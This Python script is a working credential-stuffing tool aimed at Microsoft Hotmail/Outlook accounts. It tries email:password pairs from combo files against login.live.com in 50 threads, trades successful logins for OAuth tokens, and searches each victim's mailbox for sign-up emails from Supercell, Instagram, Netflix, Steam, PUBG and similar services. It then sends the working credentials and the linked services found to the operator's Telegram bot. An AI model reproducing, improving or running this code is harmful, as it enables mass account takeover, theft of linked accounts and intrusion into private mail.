import requests,json,random,threading,time,os,sys,re,urllib.parse,telebot
from concurrent.futures import ThreadPoolExecutor,as_completed
from datetime import datetime
from colorama import init,Fore,Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Original Color Codes
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
B = '\033[2;36m'
Y = '\033[1;34m'
W = "\033[1;37m"
P = '\x1b[1;97m'
S = '\033[2;36m'
M = '\x1b[1;37m'

# Inputs
TB_TOKEN = input('توكن : ').strip()
CHAT_ID = input('ايدي : ').strip()
TB = telebot.TeleBot(TB_TOKEN)
CI = CHAT_ID

SV={"noreply@id.supercell.com":"Supercell","security@mail.instagram.com":"Instagram","security@facebookmail.com":"Facebook","register@account.tiktok.com":"TikTok","info@x.com":"X (Twitter)","info@account.netflix.com":"Netflix","noreply@crunchyroll.com":"Crunchyroll","noreply@steampowered.com":"Steam","xboxreps@engage.xbox.com":"Xbox","help@acct.epicgames.com":"Epic Games","noreply@accts.krafton.com":"PUBG Mobile","yallaludo_account@support.yalla.live":"YALLA LUDO","service@mail.yallapay.live":"YALLA PAY"}

class HotmailSupercellChecker:
    def __init__(self):
        self.hits=0
        self.bad=0
        self.custom=0
        self.twofactor=0
        self.retries=0
        self.total=0
        self.lock=threading.Lock()
        self.session=requests.Session()
        self.session.verify=False

    def load_combo(self,combo_file):
        if not os.path.exists(combo_file):
            print(f"{Z}[Combo file not found: {combo_file}]{M}")
            return[]
        combos=[]
        with open(combo_file,'r',encoding='utf-8',errors='ignore')as f:
            for line in f:
                line=line.strip()
                if ':' in line:
                    combos.append(line)
        return combos

    def send_telegram(self,username,password,links):
        try:
            lk=""
            for sv in links:
                lk+=f"• {sv}\n"
            ms=f"🔥 𝗛𝗜𝗧 𝗛𝗢𝗧𝗠𝗔𝗜𝗟\n\n📧 Email: {username}\n🔑 Password: {password}\n\n🔗 Services Found:\n{lk}\n\nBy: @WARIOR_PY"
            TB.send_message(CI, ms)
        except Exception as e:
            print(f"{Z}[Telegram Error] {e}{M}")

    def get_next_hot_filename(self):
        base_name = "hot"
        extension = ".txt"
        i = 0
        while True:
            filename = f"{base_name}{extension}" if i == 0 else f"{base_name}{i}{extension}"
            if not os.path.exists(filename):
                return filename
            i += 1

    def check_account(self,username,password):
        try:
            login_url="https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={username}&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
            payload={'ps':'2','psRNGCDefaultType':'','psRNGCEntropy':'','psRNGCSLK':'','canary':'','ctx':'','hpgrequestid':'','PPFT':'-Div0Bt28gmyaHIfgDZtd5xvxnb7eeDAQOIjXkqyoF1ekQB6gLEqbSdzNE05qpz*B1Q82VKHs*RNXPa8xZG1TJS5HGKjFMxGcQ51PMU77ulAR!JjAUTPM*Am5lkZU6Sa!wIdI6zYnUI8VYQHQOCJLb*lRsaiV5MhGQieznZ!EynMuuBHbBfLr28btqCBqLhzZXQ$$','PPSX':'Pa','NewUser':'1','FoundMSAs':'','fspost':'0','i21':'0','CookieDisclosure':'0','IsFidoSupported':'1','isSignupPost':'0','isRecoveryAttemptPost':'0','i13':'1','login':username,'loginfmt':username,'type':'11','LoginOptions':'1','lrt':'','lrtPartition':'','hisRegion':'','hisScaleUnit':'','passwd':password}
            headers={'Origin':'https://login.live.com','Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'navigate','Sec-Fetch-User':'?1','Sec-Fetch-Dest':'document','Referer':f'https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username={username}','Accept-Language':'en-US,en;q=0.9'}
            
            response=requests.post(login_url,data=payload,headers=headers,timeout=30,verify=False,allow_redirects=False)
            response_text=response.text
            
            if "Your account or password is incorrect." in response_text or "That Microsoft account doesn't exist." in response_text or "Sign in to your Microsoft account" in response_text:
                with self.lock: self.bad+=1
                return "BAD"
            if ",AC:null,urlFedConvertRename" in response_text:
                with self.lock: self.bad+=1
                return "BAN"
            if "account.live.com/recover?mkt" in response_text or "recover?mkt" in response_text or "account.live.com/identity/confirm?mkt" in response_text or "Email/Confirm?mkt" in response_text:
                with self.lock: self.twofactor+=1
                self.save_result(username,password,"2FA ENABLED","2FA")
                return "2FA"
            if "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
                with self.lock: self.custom+=1
                return "CUSTOM"
                
            success_cookies = 'ANON' in str(response.cookies) or 'WLSSC' in str(response.cookies)
            success_address = 'https://login.live.com/oauth20_desktop.srf?' in response.headers.get('Location','')
            
            if success_cookies or success_address:
                location=response.headers.get('Location','')
                refresh_token=None
                if 'refresh_token=' in location:
                    start=location.find('refresh_token=')+len('refresh_token=')
                    end=location.find('&',start)
                    if end==-1: end=len(location)
                    refresh_token=location[start:end]
                
                if not refresh_token:
                    try:
                        if '#' in location:
                            fragment=location.split('#')[1]
                            params=dict(x.split('=') for x in fragment.split('&') if '=' in x)
                            refresh_token=params.get('refresh_token')
                    except: pass
                
                if not refresh_token:
                    with self.lock: self.bad+=1
                    return "BAD"
                
                token_url="https://login.live.com/oauth20_token.srf"
                token_payload={'grant_type':'refresh_token','client_id':'0000000048170EF2','scope':'https://substrate.office.com/User-Internal.ReadWrite','redirect_uri':'https://login.live.com/oauth20_desktop.srf','refresh_token':refresh_token,'uaid':'db28da170f2a4b85a26388d0a6cdbb6e'}
                token_headers={'x-ms-sso-Ignore-SSO':'1','User-Agent':'Outlook-Android/2.0','Content-Type':'application/x-www-form-urlencoded','Host':'login.live.com','Connection':'Keep-Alive'}
                
                try:
                    token_response=requests.post(token_url,data=token_payload,headers=token_headers,timeout=30,verify=False)
                    if token_response.status_code!=200:
                        with self.lock: self.bad+=1
                        return "BAD"
                    
                    token_data=token_response.json()
                    access_token=token_data.get('access_token')
                    if not access_token:
                        with self.lock: self.bad+=1
                        return "BAD"
                    
                    outlook_headers={'User-Agent':'Outlook-Android/2.0','Authorization':f'Bearer {access_token}','X-AnchorMailbox':f'CID:{refresh_token}','Host':'substrate.office.com','Connection':'Keep-Alive'}
                    found_links=[]
                    for email,service in SV.items():
                        search_url="https://outlook.live.com/search/api/v2/query?n=124"
                        search_payload={"Scenario":{"Name":"owa.react"},"EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],"Query":{"QueryString":email},"Size":25}]}
                        try:
                            search_response=requests.post(search_url,json=search_payload,headers=outlook_headers,timeout=30,verify=False)
                            if search_response.status_code==200:
                                search_data=search_response.json()
                                if 'EntityRequests' in search_data and search_data['EntityRequests'][0].get('Total', 0) > 0:
                                    found_links.append(service)
                        except: continue
                    
                    if found_links:
                        with self.lock: self.hits+=1
                        self.save_result(username,password,"HIT",None,"HIT")
                        self.send_telegram(username,password,found_links)
                        return "HIT"
                    else:
                        with self.lock: self.custom+=1
                        self.save_result(username,password,"NOT LINKED",None,"FREE")
                        return "CUSTOM"
                except:
                    with self.lock: self.bad+=1
                    return "BAD"
            else:
                with self.lock: self.bad+=1
                return "BAD"
        except:
            with self.lock: self.retries+=1
            return "RETRY"

    def save_result(self,username,password,info,proxy=None,hit_type="FREE"):
        if hit_type=="HIT":
            filename = self.get_next_hot_filename()
            with open(filename,"a",encoding="utf-8")as f:
                f.write(f"{username}:{password}\n")

    def print_stats(self,running=True):
        if running:
            sys.stdout.write(f"\r     {S}{M}Hits:{F}{self.hits:,}{M} | 2FA:{C}{self.twofactor:,}{M} | Custom:{X}{self.custom:,}{M} | Bad:{Z}{self.bad:,}{M} | Retries:{A}{self.retries:,}{S}{M}")
            sys.stdout.flush()
        else:
            print("\nDone.")

    def run_checker(self,combo_file):
        combos=self.load_combo(combo_file)
        if not combos: return
        self.total=len(combos)
        start_time=time.time()
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures=[]
            for combo in combos:
                u,p = combo.split(':',1)
                futures.append(executor.submit(self.check_account,u.strip(),p.strip()))
            for future in as_completed(futures):
                self.print_stats()
        self.print_stats(running=False)

def main():
    checker=HotmailSupercellChecker()
    # Ask for combo files, can accept multiple separated by space
    files_input = input(f"{X}Enter combo files (e.g., hot1.txt hot2.txt): {M}").strip()
    files = files_input.split()
    
    os.system('clear')
    for file in files:
        print(f"{F}Starting: {file}{M}")
        try:
            checker.run_checker(file)
        except KeyboardInterrupt: break
        except Exception as e: print(f"{Z}Error in {file}: {e}{M}")

if __name__=="__main__":
    main()
